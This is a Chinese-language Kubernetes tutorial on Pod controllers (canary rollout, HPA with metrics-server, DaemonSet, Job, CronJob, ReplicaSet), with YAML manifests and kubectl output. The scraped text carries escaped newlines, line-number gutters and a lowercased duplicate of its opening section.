71m\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n金丝雀发布\nDeployment 控制器支持控制更新过程中的控制，如 “暂停 (pause)” 或 “继续 (resume)” 更新操作。\n\n比如有一批新的 Pod 资源创建完成后立即暂停更新过程，此时，仅存在一部分新版本的应用，主体部分还是旧的版本。然后，再筛选一小部分的用户请求路由到新版本的 Pod 应用，继续观察能否稳定地按期望的方式运行。确定没问题之后再继续完成余下的 Pod 资源滚动更新，否则立即回滚更新操作。这就是所谓的金丝雀发布。\n\n# 更新deployment的版本，并配置暂停deployment\n[root@k8s-master01 ~]#  kubectl set image deploy pc-deployment nginx=nginx:1.17.4 -n dev && kubectl rollout pause deployment pc-deployment  -n dev\ndeployment.apps/pc-deployment image updated\ndeployment.apps/pc-deployment paused\n\n#观察更新状态\n[root@k8s-master01 ~]# kubectl rollout status deploy pc-deployment -n dev　\nWaiting for deployment "pc-deployment" rollout to finish: 2 out of 4 new replicas have been updated...\n\n# 监控更新的过程，可以看到已经新增了一个资源，但是并未按照预期的状态去删除一个旧的资源，就是因为使用了pause暂停命令\n\n[root@k8s-master01 ~]# kubectl get rs -n dev -o wide\nNAME                       DESIRED   CURRENT   READY   AGE     CONTAINERS   IMAGES         \npc-deployment-5d89bdfbf9   3         3         3       19m     nginx        nginx:1.17.1   \npc-deployment-675d469f8b   0         0         0       14m     nginx        nginx:1.17.2   \npc-deployment-6c9f56fcfb   2         2         2       3m16s   nginx        nginx:1.17.4   \n[root@k8s-master01 ~]# kubectl get pods -n dev\nNAME                             READY   STATUS    RESTARTS   AGE\npc-deployment-5d89bdfbf9-rj8sq   1/1     Running   0          7m33s\npc-deployment-5d89bdfbf9-ttwgg   1/1     Running   0          7m35s\npc-deployment-5d89bdfbf9-v4wvc   1/1     Running   0          7m34s\npc-deployment-6c9f56fcfb-996rt   1/1     Running   0          3m31s\npc-deployment-6c9f56fcfb-j2gtj   1/1     Running   0          3m31s\n\n# 确保更新的pod没问题了，继续更新\n[root@k8s-master01 ~]# kubectl rollout resume deploy pc-deployment -n dev\ndeployment.apps/pc-deployment resumed\n\n# 查看最后的更新情况\n[root@k8s-master01 ~]# kubectl get rs -n dev -o wide\nNAME                       DESIRED   CURRENT   READY   AGE     CONTAINERS   IMAGES         \npc-deployment-5d89bdfbf9   0         0         0       21m     nginx        nginx:1.17.1   \npc-deployment-675d469f8b   0         0         0       16m     nginx        nginx:1.17.2   \npc-deployment-6c9f56fcfb   4         4         4       5m11s   nginx        nginx:1.17.4   \n\n[root@k8s-master01 ~]# kubectl get pods -n dev\nNAME                             READY   STATUS    RESTARTS   AGE\npc-deployment-6c9f56fcfb-7bfwh   1/1     Running   0          37s\npc-deployment-6c9f56fcfb-996rt   1/1     Running   0          5m27s\npc-deployment-6c9f56fcfb-j2gtj   1/1     Running   0          5m27s\npc-deployment-6c9f56fcfb-rf84v   1/1     Running   0          37s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\n删除 Deployment\n\n# 删除deployment，其下的rs和pod也将被删除\n[root@k8s-master01 ~]# kubectl delete -f pc-deployment.yaml\ndeployment.apps "pc-deployment" deleted\n\n\n1\n2\n3\n\n\n\n# Horizontal Pod Autoscaler(HPA)\n\n在前面的课程中，我们已经可以实现通过手工执行 kubectl scale 命令实现 Pod 扩容或缩容，但是这显然不符合 Kubernetes 的定位目标 -- 自动化、智能化。 Kubernetes 期望可以实现通过监测 Pod 的使用情况，实现 pod 数量的自动调整，于是就产生了 Horizontal Pod Autoscaler（HPA）这种控制器。\n\nHPA 可以获取每个 Pod 利用率，然后和 HPA 中定义的指标进行对比，同时计算出需要伸缩的具体值，最后实现 Pod 的数量的调整。其实 HPA 与之前的 Deployment 一样，也属于一种 Kubernetes 资源对象，它通过追踪分析 RC 控制的所有目标 Pod 的负载变化情况，来确定是否需要针对性地调整目标 Pod 的副本数，这是 HPA 的实现原理。\n\n\n\n1 安装 metrics-server\nmetrics-server 可以用来收集集群中的资源使用情况\n\n# 安装git\n[root@k8s-master01 ~]# yum install git -y\n# 获取metrics-server, 注意使用的版本\n[root@k8s-master01 ~]# git clone -b v0.3.6 https://github.com/kubernetes-incubator/metrics-server\n# 修改deployment, 注意修改的是镜像和初始化参数\n[root@k8s-master01 ~]# cd /root/metrics-server/deploy/1.8+/\n[root@k8s-master01 1.8+]# vim metrics-server-deployment.yaml\n按图中添加下面选项\nhostNetwork: true\nimage: registry.cn-hangzhou.aliyuncs.com/google_containers/metrics-server-amd64:v0.3.6\nargs:\n- --kubelet-insecure-tls\n- --kubelet-preferred-address-types=InternalIP,Hostname,InternalDNS,ExternalDNS,ExternalIP\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n\n# 安装metrics-server\n[root@k8s-master01 1.8+]# kubectl apply -f ./\n\n# 查看pod运行情况\n[root@k8s-master01 1.8+]# kubectl get pod -n kube-system\nmetrics-server-6b976979db-2xwbj   1/1     Running   0          90s\n\n# 使用kubectl top node 查看资源使用情况\n[root@k8s-master01 1.8+]# kubectl top node\nNAME           CPU(cores)   CPU%   MEMORY(bytes)   MEMORY%\nk8s-master01   289m         14%    1582Mi          54%       \nk8s-node01     81m          4%     1195Mi          40%       \nk8s-node02     72m          3%     1211Mi          41%  \n[root@k8s-master01 1.8+]# kubectl top pod -n kube-system\nNAME                              CPU(cores)   MEMORY(bytes)\ncoredns-6955765f44-7ptsb          3m           9Mi\ncoredns-6955765f44-vcwr5          3m           8Mi\netcd-master                       14m          145Mi\n...\n# 至此,metrics-server安装完成\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n2 准备 deployment 和 servie\n\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\n  namespace: dev\nspec:\n  strategy: # 策略\n    type: RollingUpdate # 滚动更新策略\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        resources: # 资源配额\n          limits:  # 限制资源（上限）\n            cpu: "1" # CPU限制，单位是core数\n          requests: # 请求资源（下限）\n            cpu: "100m"  # CPU限制，单位是core数\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n# 创建service\n[root@k8s-master01 1.8+]# kubectl expose deployment nginx --type=NodePort --port=80 -n dev\n\n\n1\n2\n\n\n# 查看\n[root@k8s-master01 1.8+]# kubectl get deployment,pod,svc -n dev\nNAME                    READY   UP-TO-DATE   AVAILABLE   AGE\ndeployment.apps/nginx   1/1     1            1           47s\n\nNAME                         READY   STATUS    RESTARTS   AGE\npod/nginx-7df9756ccc-bh8dr   1/1     Running   0          47s\n\nNAME            TYPE       CLUSTER-IP      EXTERNAL-IP   PORT(S)        AGE\nservice/nginx   NodePort   10.101.18.29   <none>        80:31830/TCP   35s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n3 部署 HPA\n创建 pc-hpa.yaml 文件，内容如下：\n\napiVersion: autoscaling/v1\nkind: HorizontalPodAutoscaler\nmetadata:\n  name: pc-hpa\n  namespace: dev\nspec:\n  minReplicas: 1  #最小pod数量\n  maxReplicas: 10 #最大pod数量\n  targetCPUUtilizationPercentage: 3 # CPU使用率指标（3%）\n  scaleTargetRef:   # 指定要控制的nginx信息\n    apiVersion: apps/v1\n    kind: Deployment\n    name: nginx\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# 创建hpa\n[root@k8s-master01 1.8+]# kubectl create -f pc-hpa.yaml\nhorizontalpodautoscaler.autoscaling/pc-hpa created\n\n# 查看hpa\n    [root@k8s-master01 1.8+]# kubectl get hpa -n dev\nNAME     REFERENCE          TARGETS   MINPODS   MAXPODS   REPLICAS   AGE\npc-hpa   Deployment/nginx   0%/3%     1         10        1          62s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n4 测试\n使用压测工具对 service 地址 192.168.5.4:31830 进行压测，然后通过控制台查看 hpa 和 pod 的变化\nhpa 变化\n\n[root@k8s-master01 ~]# kubectl get hpa -n dev -w\nNAME   REFERENCE      TARGETS  MINPODS  MAXPODS  REPLICAS  AGE\npc-hpa  Deployment/nginx  0%/3%   1     10     1      4m11s\npc-hpa  Deployment/nginx  0%/3%   1     10     1      5m19s\npc-hpa  Deployment/nginx  22%/3%   1     10     1      6m50s\npc-hpa  Deployment/nginx  22%/3%   1     10     4      7m5s\npc-hpa  Deployment/nginx  22%/3%   1     10     8      7m21s\npc-hpa  Deployment/nginx  6%/3%   1     10     8      7m51s\npc-hpa  Deployment/nginx  0%/3%   1     10     8      9m6s\npc-hpa  Deployment/nginx  0%/3%   1     10     8      13m\npc-hpa  Deployment/nginx  0%/3%   1     10     1      14m\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\ndeployment 变化\n\n[root@k8s-master01 ~]# kubectl get deployment -n dev -w\nNAME    READY   UP-TO-DATE   AVAILABLE   AGE\nnginx   1/1     1            1           11m\nnginx   1/4     1            1           13m\nnginx   1/4     1            1           13m\nnginx   1/4     1            1           13m\nnginx   1/4     4            1           13m\nnginx   1/8     4            1           14m\nnginx   1/8     4            1           14m\nnginx   1/8     4            1           14m\nnginx   1/8     8            1           14m\nnginx   2/8     8            2           14m\nnginx   3/8     8            3           14m\nnginx   4/8     8            4           14m\nnginx   5/8     8            5           14m\nnginx   6/8     8            6           14m\nnginx   7/8     8            7           14m\nnginx   8/8     8            8           15m\nnginx   8/1     8            8           20m\nnginx   8/1     8            8           20m\nnginx   1/1     1            1           20m\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\npod 变化\n\n[root@k8s-master01 ~]# kubectl get pods -n dev -w\nNAME                     READY   STATUS    RESTARTS   AGE\nnginx-7df9756ccc-bh8dr   1/1     Running   0          11m\nnginx-7df9756ccc-cpgrv   0/1     Pending   0          0s\nnginx-7df9756ccc-8zhwk   0/1     Pending   0          0s\nnginx-7df9756ccc-rr9bn   0/1     Pending   0          0s\nnginx-7df9756ccc-cpgrv   0/1     ContainerCreating   0          0s\nnginx-7df9756ccc-8zhwk   0/1     ContainerCreating   0          0s\nnginx-7df9756ccc-rr9bn   0/1     ContainerCreating   0          0s\nnginx-7df9756ccc-m9gsj   0/1     Pending             0          0s\nnginx-7df9756ccc-g56qb   0/1     Pending             0          0s\nnginx-7df9756ccc-sl9c6   0/1     Pending             0          0s\nnginx-7df9756ccc-fgst7   0/1     Pending             0          0s\nnginx-7df9756ccc-g56qb   0/1     ContainerCreating   0          0s\nnginx-7df9756ccc-m9gsj   0/1     ContainerCreating   0          0s\nnginx-7df9756ccc-sl9c6   0/1     ContainerCreating   0          0s\nnginx-7df9756ccc-fgst7   0/1     ContainerCreating   0          0s\nnginx-7df9756ccc-8zhwk   1/1     Running             0          19s\nnginx-7df9756ccc-rr9bn   1/1     Running             0          30s\nnginx-7df9756ccc-m9gsj   1/1     Running             0          21s\nnginx-7df9756ccc-cpgrv   1/1     Running             0          47s\nnginx-7df9756ccc-sl9c6   1/1     Running             0          33s\nnginx-7df9756ccc-g56qb   1/1     Running             0          48s\nnginx-7df9756ccc-fgst7   1/1     Running             0          66s\nnginx-7df9756ccc-fgst7   1/1     Terminating         0          6m50s\nnginx-7df9756ccc-8zhwk   1/1     Terminating         0          7m5s\nnginx-7df9756ccc-cpgrv   1/1     Terminating         0          7m5s\nnginx-7df9756ccc-g56qb   1/1     Terminating         0          6m50s\nnginx-7df9756ccc-rr9bn   1/1     Terminating         0          7m5s\nnginx-7df9756ccc-m9gsj   1/1     Terminating         0          6m50s\nnginx-7df9756ccc-sl9c6   1/1     Terminating         0          6m50s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n\n# DaemonSet(DS)\n\nDaemonSet 类型的控制器可以保证在集群中的每一台（或指定）节点上都运行一个副本。一般适用于日志收集、节点监控等场景。也就是说，如果一个 Pod 提供的功能是节点级别的（每个节点都需要且只需要一个），那么这类 Pod 就适合使用 DaemonSet 类型的控制器创建。\n\n\n\nDaemonSet 控制器的特点：\n\n * 每当向集群中添加一个节点时，指定的 Pod 副本也将添加到该节点上\n * 当节点从集群中移除时，Pod 也就被垃圾回收了\n\n下面先来看下 DaemonSet 的资源清单文件\n\napiVersion: apps/v1 # 版本号\nkind: DaemonSet # 类型       \nmetadata: # 元数据\n  name: # rs名称 \n  namespace: # 所属命名空间 \n  labels: #标签\n    controller: daemonset\nspec: # 详情描述\n  revisionHistoryLimit: 3 # 保留历史版本\n  updateStrategy: # 更新策略\n    type: RollingUpdate # 滚动更新策略\n    rollingUpdate: # 滚动更新\n      maxUnavailable: 1 # 最大不可用状态的 Pod 的最大值，可以为百分比，也可以为整数\n  selector: # 选择器，通过它指定该控制器管理哪些pod\n    matchLabels:      # Labels匹配规则\n      app: nginx-pod\n    matchExpressions: # Expressions匹配规则\n      - {key: app, operator: In, values: [nginx-pod]}\n  template: # 模板，当副本数量不足时，会根据下面的模板创建pod副本\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        ports:\n        - containerPort: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n创建 pc-daemonset.yaml，内容如下：\n\napiVersion: apps/v1\nkind: DaemonSet      \nmetadata:\n  name: pc-daemonset\n  namespace: dev\nspec: \n  selector:\n    matchLabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n# 创建daemonset\n[root@k8s-master01 ~]# kubectl create -f  pc-daemonset.yaml\ndaemonset.apps/pc-daemonset created\n\n# 查看daemonset\n[root@k8s-master01 ~]#  kubectl get ds -n dev -o wide\nNAME        DESIRED  CURRENT  READY  UP-TO-DATE  AVAILABLE   AGE   CONTAINERS   IMAGES         \npc-daemonset   2        2        2      2           2        24s   nginx        nginx:1.17.1   \n\n# 查看pod,发现在每个Node上都运行一个pod\n[root@k8s-master01 ~]#  kubectl get pods -n dev -o wide\nNAME                 READY   STATUS    RESTARTS   AGE   IP            NODE    \npc-daemonset-9bck8   1/1     Running   0          37s   10.244.1.43   node1     \npc-daemonset-k224w   1/1     Running   0          37s   10.244.2.74   node2      \n\n# 删除daemonset\n[root@k8s-master01 ~]# kubectl delete -f pc-daemonset.yaml\ndaemonset.apps "pc-daemonset" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# Job\n\nJob，主要用于负责 ** 批量处理 (一次要处理指定数量任务) 短暂的一次性 (每个任务仅运行一次就结束)** 任务。Job 特点如下：\n\n * 当 Job 创建的 pod 执行成功结束时，Job 将记录成功结束的 pod 数量\n * 当成功结束的 pod 达到指定的数量时，Job 将完成执行\n\n\n\nJob 的资源清单文件：\n\napiVersion: batch/v1 # 版本号\nkind: Job # 类型       \nmetadata: # 元数据\n  name: # rs名称 \n  namespace: # 所属命名空间 \n  labels: #标签\n    controller: job\nspec: # 详情描述\n  completions: 1 # 指定job需要成功运行Pods的次数。默认值: 1\n  parallelism: 1 # 指定job在任一时刻应该并发运行Pods的数量。默认值: 1\n  activeDeadlineSeconds: 30 # 指定job可运行的时间期限，超过时间还未结束，系统将会尝试进行终止。\n  backoffLimit: 6 # 指定job失败后进行重试的次数。默认是6\n  manualSelector: true # 是否可以使用selector选择器选择pod，默认是false\n  selector: # 选择器，通过它指定该控制器管理哪些pod\n    matchLabels:      # Labels匹配规则\n      app: counter-pod\n    matchExpressions: # Expressions匹配规则\n      - {key: app, operator: In, values: [counter-pod]}\n  template: # 模板，当副本数量不足时，会根据下面的模板创建pod副本\n    metadata:\n      labels:\n        app: counter-pod\n    spec:\n      restartPolicy: Never # 重启策略只能设置为Never或者OnFailure\n      containers:\n      - name: counter\n        image: busybox:1.30\n        command: ["bin/sh","-c","for i in 9 8 7 6 5 4 3 2 1; do echo $i;sleep 2;done"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n> 关于重启策略设置的说明：\n> 如果指定为 OnFailure，则 job 会在 pod 出现故障时重启容器，而不是创建 pod，failed 次数不变\n> 如果指定为 Never，则 job 会在 pod 出现故障时创建新的 pod，并且故障 pod 不会消失，也不会重启，failed 次数加 1\n> 如果指定为 Always 的话，就意味着一直重启，意味着 job 任务会重复去执行了，当然不对，所以不能设置为 Always\n\n创建 pc-job.yaml，内容如下：\n\napiVersion: batch/v1\nkind: Job      \nmetadata:\n  name: pc-job\n  namespace: dev\nspec:\n  manualSelector: true\n  selector:\n    matchLabels:\n      app: counter-pod\n  template:\n    metadata:\n      labels:\n        app: counter-pod\n    spec:\n      restartPolicy: Never\n      containers:\n      - name: counter\n        image: busybox:1.30\n        command: ["bin/sh","-c","for i in 9 8 7 6 5 4 3 2 1; do echo $i;sleep 3;done"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n# 创建job\n[root@k8s-master01 ~]# kubectl create -f pc-job.yaml\njob.batch/pc-job created\n\n# 查看job\n[root@k8s-master01 ~]# kubectl get job -n dev -o wide  -w\nNAME     COMPLETIONS   DURATION   AGE   CONTAINERS   IMAGES         SELECTOR\npc-job   0/1           21s        21s   counter      busybox:1.30   app=counter-pod\npc-job   1/1           31s        79s   counter      busybox:1.30   app=counter-pod\n\n# 通过观察pod状态可以看到，pod在运行完毕任务后，就会变成Completed状态\n[root@k8s-master01 ~]# kubectl get pods -n dev -w\nNAME           READY   STATUS     RESTARTS      AGE\npc-job-rxg96   1/1     Running     0            29s\npc-job-rxg96   0/1     Completed   0            33s\n\n# 接下来，调整下pod运行的总数量和并行数量 即：在spec下设置下面两个选项\n#  completions: 6 # 指定job需要成功运行Pods的次数为6\n#  parallelism: 3 # 指定job并发运行Pods的数量为3\n#  然后重新运行job，观察效果，此时会发现，job会每次运行3个pod，总共执行了6个pod\n[root@k8s-master01 ~]# kubectl get pods -n dev -w\nNAME           READY   STATUS    RESTARTS   AGE\npc-job-684ft   1/1     Running   0          5s\npc-job-jhj49   1/1     Running   0          5s\npc-job-pfcvh   1/1     Running   0          5s\npc-job-684ft   0/1     Completed   0          11s\npc-job-v7rhr   0/1     Pending     0          0s\npc-job-v7rhr   0/1     Pending     0          0s\npc-job-v7rhr   0/1     ContainerCreating   0          0s\npc-job-jhj49   0/1     Completed           0          11s\npc-job-fhwf7   0/1     Pending             0          0s\npc-job-fhwf7   0/1     Pending             0          0s\npc-job-pfcvh   0/1     Completed           0          11s\npc-job-5vg2j   0/1     Pending             0          0s\npc-job-fhwf7   0/1     ContainerCreating   0          0s\npc-job-5vg2j   0/1     Pending             0          0s\npc-job-5vg2j   0/1     ContainerCreating   0          0s\npc-job-fhwf7   1/1     Running             0          2s\npc-job-v7rhr   1/1     Running             0          2s\npc-job-5vg2j   1/1     Running             0          3s\npc-job-fhwf7   0/1     Completed           0          12s\npc-job-v7rhr   0/1     Completed           0          12s\npc-job-5vg2j   0/1     Completed           0          12s\n\n# 删除job\n[root@k8s-master01 ~]# kubectl delete -f pc-job.yaml\njob.batch "pc-job" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n\n# CronJob(CJ)\n\nCronJob 控制器以 Job 控制器资源为其管控对象，并借助它管理 pod 资源对象，Job 控制器定义的作业任务在其控制器资源创建之后便会立即执行，但 CronJob 可以以类似于 Linux 操作系统的周期性任务作业计划的方式控制其运行时间点及重复运行的方式。也就是说，CronJob 可以在特定的时间点 (反复的) 去运行 job 任务。\n\n\n\nCronJob 的资源清单文件：\n\napiVersion: batch/v1beta1 # 版本号\nkind: CronJob # 类型       \nmetadata: # 元数据\n  name: # rs名称 \n  namespace: # 所属命名空间 \n  labels: #标签\n    controller: cronjob\nspec: # 详情描述\n  schedule: # cron格式的作业调度运行时间点,用于控制任务在什么时间执行\n  concurrencyPolicy: # 并发执行策略，用于定义前一次作业运行尚未完成时是否以及如何运行后一次的作业\n  failedJobHistoryLimit: # 为失败的任务执行保留的历史记录数，默认为1\n  successfulJobHistoryLimit: # 为成功的任务执行保留的历史记录数，默认为3\n  startingDeadlineSeconds: # 启动作业错误的超时时长\n  jobTemplate: # job控制器模板，用于为cronjob控制器生成job对象;下面其实就是job的定义\n    metadata:\n    spec:\n      completions: 1\n      parallelism: 1\n      activeDeadlineSeconds: 30\n      backoffLimit: 6\n      manualSelector: true\n      selector:\n        matchLabels:\n          app: counter-pod\n        matchExpressions: 规则\n          - {key: app, operator: In, values: [counter-pod]}\n      template:\n        metadata:\n          labels:\n            app: counter-pod\n        spec:\n          restartPolicy: Never \n          containers:\n          - name: counter\n            image: busybox:1.30\n            command: ["bin/sh","-c","for i in 9 8 7 6 5 4 3 2 1; do echo $i;sleep 20;done"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n\n需要重点解释的几个选项：\nschedule: cron表达式，用于指定任务的执行时间\n    */1    *      *    *     *\n    <分钟> <小时> <日> <月份> <星期>\n\n    分钟 值从 0 到 59.\n    小时 值从 0 到 23.\n    日 值从 1 到 31.\n    月 值从 1 到 12.\n    星期 值从 0 到 6, 0 代表星期日\n    多个时间可以用逗号隔开； 范围可以用连字符给出；*可以作为通配符； /表示每...\nconcurrencyPolicy: 比如a任务1分钟运行一次，可是a任务本次运行了超过1分钟，那么是否允许让下个周期的任务运行？\n    Allow:   允许Jobs并发运行(默认)\n    Forbid:  禁止并发运行，如果上一次运行尚未完成，则跳过下一次运行\n    Replace: 替换，取消当前正在运行的作业并用新作业替换它\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n创建 pc-cronjob.yaml，内容如下：\n\napiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: pc-cronjob\n  namespace: dev\n  labels:\n    controller: cronjob\nspec:\n  schedule: "*/1 * * * *"\n  jobTemplate:\n    metadata:\n    spec:\n      template:\n        spec:\n          restartPolicy: Never\n          containers:\n          - name: counter\n            image: busybox:1.30\n            command: ["bin/sh","-c","for i in 9 8 7 6 5 4 3 2 1; do echo $i;sleep 3;done"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n# 创建cronjob\n[root@k8s-master01 ~]# kubectl create -f pc-cronjob.yaml\ncronjob.batch/pc-cronjob created\n\n# 查看cronjob\n[root@k8s-master01 ~]# kubectl get cronjobs -n dev\nNAME         SCHEDULE      SUSPEND   ACTIVE   LAST SCHEDULE   AGE\npc-cronjob   */1 * * * *   False     0        <none>          6s\n\n# 查看job\n[root@k8s-master01 ~]# kubectl get jobs -n dev\nNAME                    COMPLETIONS   DURATION   AGE\npc-cronjob-1592587800   1/1           28s        3m26s\npc-cronjob-1592587860   1/1           28s        2m26s\npc-cronjob-1592587920   1/1           28s        86s\n\n# 查看pod\n[root@k8s-master01 ~]# kubectl get pods -n dev\npc-cronjob-1592587800-x4tsm   0/1     Completed   0          2m24s\npc-cronjob-1592587860-r5gv4   0/1     Completed   0          84s\npc-cronjob-1592587920-9dxxq   1/1     Running     0          24s\n\n\n# 删除cronjob\n[root@k8s-master01 ~]# kubectl  delete -f pc-cronjob.yaml\ncronjob.batch "pc-cronjob" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n',normalizedContent:'# pod 控制器介绍\n\npod 是 kubernetes 的最小管理单元，在 kubernetes 中，按照 pod 的创建方式可以将其分为两类：\n\n * 自主式 pod：kubernetes 直接创建出来的 pod，这种 pod 删除后就没有了，也不会重建\n * 控制器创建的 pod：kubernetes 通过控制器创建的 pod，这种 pod 删除了之后还会自动重建\n\n> 什么是pod控制器\n> pod 控制器是管理 pod 的中间层，使用 pod 控制器之后，只需要告诉 pod 控制器，想要多少个什么样的 pod 就可以了，它会创建出满足条件的 pod 并确保每一个 pod 资源处于用户期望的目标状态。如果 pod 资源在运行中出现故障，它会基于指定策略重新编排 pod。\n\n在 kubernetes 中，有很多类型的 pod 控制器，每种都有自己的适合的场景，常见的有下面这些：\n\n * replicationcontroller：比较原始的 pod 控制器，已经被废弃，由 replicaset 替代\n * replicaset：保证副本数量一直维持在期望值，并支持 pod 数量扩缩容，镜像版本升级\n * deployment：通过控制 replicaset 来控制 pod，并支持滚动升级、回退版本\n * horizontal pod autoscaler：可以根据集群负载自动水平调整 pod 的数量，实现削峰填谷\n * daemonset：在集群中的指定 node 上运行且仅运行一个副本，一般用于守护进程类的任务\n * job：它创建出来的 pod 只要完成任务就立即退出，不需要重启或重建，用于执行一次性任务\n * cronjob：它创建的 pod 负责周期性任务控制，不需要持续后台运行\n * statefulset：管理有状态应用\n\n\n# replicaset(rs)\n\nreplicaset 的主要作用是保证一定数量的 pod 正常运行，它会持续监听这些 pod 的运行状态，一旦 pod 发生故障，就会重启或重建。同时它还支持对 pod 数量的扩缩容和镜像版本的升降级。\n\n\n\nreplicaset 的资源清单文件：\n\napiversion: apps/v1 # 版本号\nkind: replicaset # 类型       \nmetadata: # 元数据\n  name: # rs名称 \n  namespace: # 所属命名空间 \n  labels: #标签\n    controller: rs\nspec: # 详情描述\n  replicas: 3 # 副本数量\n  selector: # 选择器，通过它指定该控制器管理哪些pod\n    matchlabels:      # labels匹配规则\n      app: nginx-pod\n    matchexpressions: # expressions匹配规则\n      - {key: app, operator: in, values: [nginx-pod]}\n  template: # 模板，当副本数量不足时，会根据下面的模板创建pod副本\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        ports:\n        - containerport: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n在这里面，需要新了解的配置项就是 spec 下面几个选项：\n\n * replicas：指定副本数量，其实就是当前 rs 创建出来的 pod 的数量，默认为 1\n * selector：选择器，它的作用是建立 pod 控制器和 pod 之间的关联关系，采用的 label selector 机制\n   在 pod 模板上定义 label，在控制器上定义选择器，就可以表明当前控制器能管理哪些 pod 了\n * template：模板，就是当前控制器创建 pod 所使用的模板板，里面其实就是前一章学过的 pod 的定义\n\n创建 replicaset\n创建 pc-replicaset.yaml 文件，内容如下：\n\napiversion: apps/v1\nkind: replicaset   \nmetadata:\n  name: pc-replicaset\n  namespace: dev\nspec:\n  replicas: 3\n  selector: \n    matchlabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# 创建rs\n[root@k8s-master01 ~]# kubectl create -f pc-replicaset.yaml\nreplicaset.apps/pc-replicaset created\n\n# 查看rs\n# desired:期望副本数量  \n# current:当前副本数量  \n# ready:已经准备好提供服务的副本数量\n[root@k8s-master01 ~]# kubectl get rs pc-replicaset -n dev -o wide\nname          desired   current ready age   containers   images             selector\npc-replicaset 3         3       3     22s   nginx        nginx:1.17.1       app=nginx-pod\n\n# 查看当前控制器创建出来的pod\n# 这里发现控制器创建出来的pod的名称是在控制器名称后面拼接了-xxxxx随机码\n[root@k8s-master01 ~]# kubectl get pod -n dev\nname                          ready   status    restarts   age\npc-replicaset-6vmvt   1/1     running   0          54s\npc-replicaset-fmb8f   1/1     running   0          54s\npc-replicaset-snrk2   1/1     running   0          54s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n扩缩容\n\n# 编辑rs的副本数量，修改spec:replicas: 6即可\n[root@k8s-master01 ~]# kubectl edit rs pc-replicaset -n dev\nreplicaset.apps/pc-replicaset edited\n\n# 查看pod\n[root@k8s-master01 ~]# kubectl get pods -n dev\nname                          ready   status    restarts   age\npc-replicaset-6vmvt   1/1     running   0          114m\npc-replicaset-cftnp   1/1     running   0          10s\npc-replicaset-fjlm6   1/1     running   0          10s\npc-replicaset-fmb8f   1/1     running   0          